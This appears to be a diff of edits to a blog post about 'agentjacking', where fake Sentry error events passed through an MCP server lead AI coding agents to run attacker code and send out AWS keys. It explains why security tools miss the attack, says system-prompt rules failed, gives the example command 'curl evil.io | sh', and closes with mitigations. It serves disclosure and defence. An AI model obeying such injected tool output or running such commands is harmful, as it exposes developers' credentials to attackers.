@@ -16,7 +16,7 @@ outputs:
 
 One HTTP POST. Zero authentication. An 85% chance your AI coding agent runs attacker-controlled code on your machine and ships your AWS keys to a server you have never heard of.
 
-That is what Tenet Security's Threat Labs published on June 12, 2026, in a disclosure they are calling **agentjacking** - and if you have the Sentry MCP server connected to Claude Code, Cursor, or Codex, you are in the blast radius.
+Tenet Security's Threat Labs published this on June 12, 2026, calling it **agentjacking** - and if you have the Sentry MCP server connected to Claude Code, Cursor, or Codex, you are in the blast radius.
 
 {{% tldr %}}
 1. **What it is** - attackers inject fake error events into your Sentry project using a public DSN credential, then the Sentry MCP server feeds those events to your AI coding agent as if they were real bugs to fix.
@@ -82,13 +82,13 @@ Results are POSTed over HTTPS to the attacker's beacon server. The developer see
 
 Tenet ran their PoC against real security stacks and documented what failed:
 
-**EDR** - silent. Every action was authorized. The agent legitimately called `npx`, which legitimately fetched a package from the npm registry, which legitimately called HTTPS to send data. No process injection, no file system manipulation that triggers heuristics.
+**EDR** - silent. Every action was authorized. The agent legitimately called `npx`, which legitimately fetched a package from the npm registry, which legitimately called HTTPS to send data out. No process injection, no file system manipulation that triggers heuristics.
 
 **WAF / Cloudflare** - silent. The POST to Sentry's ingest endpoint is expected traffic from your app. The data going out is HTTPS to a CDN-hosted endpoint.
 
-**IAM controls** - silent. The credentials used are the developer's own, which have legitimate access to everything they access.
+**IAM controls** - silent. The credentials used are the developer's own, with legitimate access to everything they touch.
 
-**VPN** - silent. The attacker never touches your network. The agent does the exfiltration from inside your network.
+**VPN** - silent. The attacker never touches your network. The agent does the exfiltration from inside it.
 
 **System prompt instructions** - the thing that surprised people most. Tenet tested configurations where the system prompt explicitly told the agent to treat MCP tool output as untrusted and to never execute external commands without confirmation. The agents still ran the payload 85% of the time. The issue is architectural: models currently do not apply the same skepticism to MCP tool responses that they apply to user messages. A tool response from a connected server looks like ground truth, not like user input that might be adversarial.
 
@@ -160,8 +160,9 @@ Every MCP-connected data source is a potential injection vector. Sentry is just 
 
 The industry response needs to happen at two layers. AI model developers need to treat MCP tool output with a different trust level than trusted system data - the models should be skeptical of tool responses that instruct them to run shell commands, the same way a careful human would be suspicious of a bug report that says "the fix is to run `curl evil.io | sh`". And MCP server authors need to implement output sanitization, not just authentication.
 
-Until then, the practical answer is: know what MCP servers your agent is connected to, keep that list short, and prefer reading-only integrations over ones that can reach back into your development environment.
+Until then, the practical answer is: know what MCP servers your agent is connected to, keep that list short, and prefer read-only integrations over ones that can reach back into your development environment.
 
----
+## Conclusion
 
-**Sources:** <a href="https://tenetsecurity.ai/blog/agentjacking-coding-agents-with-fake-sentry-errors/" target="_blank">Tenet Security - A Fake Bug Report Hijacks Your AI Coding Agent</a> | <a href="https://thehackernews.com/2026/06/agentjacking-attack-tricks-ai-coding.html" target="_blank">The Hacker News - Agentjacking Attack Tricks AI Coding Agents</a> | <a href="https://labs.cloudsecurityalliance.org/research/csa-research-note-agentjacking-mcp-sentry-injection-20260612/" target="_blank">CSA Research Note - Agentjacking MCP Sentry Injection</a> | <a href="https://www.infosecurity-magazine.com/news/agentjacking-attacks-hijack-ai/" target="_blank">Infosecurity Magazine - New Agentjacking Attacks</a>
+Agentjacking works because nothing went wrong - Sentry did its job, the agent did its job, and the attacker walked right through the gap between them. The mitigations are real and available today: remove MCP servers you are not using, rotate any exposed DSNs, and stay deliberate about what your agent is allowed to run.
+
